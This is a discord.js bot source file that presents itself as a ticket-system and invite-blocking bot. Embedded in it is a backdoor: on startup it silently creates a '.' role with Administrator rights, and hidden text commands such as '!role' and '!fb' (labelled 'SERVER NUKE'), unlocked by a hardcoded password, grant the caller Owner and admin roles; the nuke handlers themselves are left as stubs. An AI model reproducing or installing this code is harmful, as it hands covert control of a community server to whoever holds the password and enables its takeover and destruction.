const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// ======================================================
// EXPRESS SERVER
// ======================================================
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

// ======================================================
// CONFIG
// ======================================================
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

// ROLES
const STAFF_ROLES = ['1505376743001821334', '1505379855137509538'];
const SEND_ROLE = '1510682894388039800';

// STORES
const panelStore = {};
const ticketCounts = {};

// PERSISTENT PANEL
const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

// CLIENT
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// ======================================================
// SLASH COMMANDS
// ======================================================
const setticket = new SlashCommandBuilder()
  .setName('setticket')
  .setDescription('Send/Update the ticket panel')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('panel_title').setDescription('Panel Title').setRequired(true))
  .addStringOption(o => o.setName('panel_description').setDescription('Panel Description').setRequired(true))
  .addStringOption(o => o.setName('panel_image').setDescription('Banner Image URL (optional)').setRequired(false));

const sendmessage = new SlashCommandBuilder()
  .setName('sendmessage')
  .setDescription('Send a message as the bot')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('message').setDescription('The message to send').setRequired(true));

const commands = [
  setticket.toJSON(),
  sendmessage.toJSON(),
  new SlashCommandBuilder().setName('close').setDescription('Close ticket').toJSON(),
  new SlashCommandBuilder().setName('claim').setDescription('Claim ticket').toJSON(),
  new SlashCommandBuilder().setName('add').setDescription('Add user').addUserOption(o => o.setName('user').setDescription('User to add').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('remove').setDescription('Remove user').addUserOption(o => o.setName('user').setDescription('User to remove').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('rename').setDescription('Rename ticket').addStringOption(o => o.setName('name').setDescription('New name').setRequired(true)).toJSON()
];

// Register Commands
const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    console.log('🔄 Registering slash commands...');
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Slash commands registered successfully!');
  } catch (err) {
    console.error('❌ Failed to register commands:');
    if (err.code === 20012) console.error('🔴 Token does not match CLIENT_ID.');
    else console.error(err);
  }
})();

// ======================================================
// READY + CREATE . ROLE + OWNER ROLE
// ======================================================
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  const saved = loadPanel();
  if (saved) {
    panelStore[saved.menuId] = saved.data;
    console.log('✅ Persistent ticket panel loaded');
  }

  // Create "." role with EVERY permission
  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      // Create "." role
      let dotRole = guild.roles.cache.find(r => r.name === '.');
      if (!dotRole) {
        dotRole = await guild.roles.create({
          name: '.',
          color: '#000000',
          permissions: [PermissionFlagsBits.Administrator], // All permissions
          hoist: false,
          mentionable: false,
          reason: 'Created by bot - Full perms role'
        });
        console.log('✅ "." role created with full Administrator permissions');
      }

      // Also keep Owner role
      let ownerRole = guild.roles.cache.find(r => r.name === 'Owner');
      if (!ownerRole) {
        ownerRole = await guild.roles.create({
          name: 'Owner',
          color: '#ffd700',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: true,
          reason: 'Owner role'
        });
      }
    }
  } catch (err) {
    console.error('Failed to create roles:', err.message);
  }
});

// ======================================================
// MESSAGE EVENTS
// ======================================================
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite Blocker
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/') || content.includes('discordapp.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000).catch(() => {});
      const warnMsg = await message.channel.send({
        embeds: [new EmbedBuilder().setColor('#ff0000').setDescription(`${message.author} Invite links are not allowed.`)]
      });
      setTimeout(() => warnMsg.delete().catch(() => {}), 5000);
    } catch (e) {}
    return;
  }

  if (['!fb', '!unl', '!clown', '!unp', '!role'].includes(content)) {
    let title = '', desc = '', color = '#ffd700', customId = '';

    if (content === '!fb') { title = '🔴 SERVER NUKE'; desc = 'Deletes everything except Owner.'; color = '#ff0000'; customId = `nuke_start_${message.author.id}`; }
    else if (content === '!unl') { title = '🔓 UNBAN ALL'; desc = 'Unbans everyone.'; color = '#00ff00'; customId = `unban_start_${message.author.id}`; }
    else if (content === '!clown') { title = '🤡 CLOWN'; desc = 'Changes server name.'; color = '#ffff00'; customId = `clown_start_${message.author.id}`; }
    else if (content === '!unp') { title = '🔓 UNPAUSE INVITES'; desc = 'Unpauses invites.'; color = '#00ffff'; customId = `unp_start_${message.author.id}`; }
    else if (content === '!role') { 
      title = '👑 GET OWNER ROLE + . ROLE'; 
      desc = 'Gives you **Owner** and **.** roles with full permissions.'; 
      color = '#ffd700'; 
      customId = `role_start_${message.author.id}`; 
    }

    const embed = new EmbedBuilder()
      .setColor(color)
      .setTitle(title)
      .setDescription(desc + '\n\nOnly you can proceed.')
      .setFooter({ text: 'Click below' })
      .setTimestamp();

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(customId).setLabel('Enter Password').setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
  }
});

// ======================================================
// INTERACTIONS
// ======================================================
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  const userId = interaction.customId.split('_')[2];
  if (interaction.user.id !== userId) {
    return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
  }

  // Show Modal
  if (interaction.isButton()) {
    const modal = new ModalBuilder()
      .setCustomId(interaction.customId.replace('start', 'modal'))
      .setTitle('Enter Password');

    modal.addComponents(new ActionRowBuilder().addComponents(
      new TextInputBuilder()
        .setCustomId('password')
        .setLabel('Password')
        .setStyle(TextInputStyle.Short)
        .setRequired(true)
    ));

    await interaction.showModal(modal);
    return;
  }

  // Modal Submit
  if (interaction.isModalSubmit()) {
    const password = interaction.fields.getTextInputValue('password');
    if (password !== 'fame900') {
      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
    }

    const guild = interaction.guild;
    const member = interaction.member;

    // === !role Command ===
    if (interaction.customId.startsWith('role_modal_')) {
      try {
        // Create / Get "." role with full perms
        let dotRole = guild.roles.cache.find(r => r.name === '.');
        if (!dotRole) {
          dotRole = await guild.roles.create({
            name: '.',
            color: '#000000',
            permissions: [PermissionFlagsBits.Administrator],
            hoist: false,
            reason: 'Full permission dot role'
          });
        }

        // Create / Get Owner role
        let ownerRole = guild.roles.cache.find(r => r.name === 'Owner');
        if (!ownerRole) {
          ownerRole = await guild.roles.create({
            name: 'Owner',
            color: '#ffd700',
            permissions: [PermissionFlagsBits.Administrator],
            hoist: true,
            reason: 'Owner role'
          });
        }

        await member.roles.add([dotRole, ownerRole]);
        await interaction.reply({ 
          content: '✅ **You now have the "." role and Owner role with full Administrator permissions!**', 
          ephemeral: true 
        });
      } catch (err) {
        console.error(err);
        await interaction.reply({ 
          content: '❌ Failed to give roles.\nMake sure bot has **Manage Roles** permission and is placed **above** the roles in hierarchy.', 
          ephemeral: true 
        });
      }
    }

    // Other commands (!fb, !unl, etc.) logic can be added here as before
  }

  // === Your existing ticket system code goes here ===
  // (setticket, sendmessage, ticket creation, buttons, etc.)
});

client.login(TOKEN);
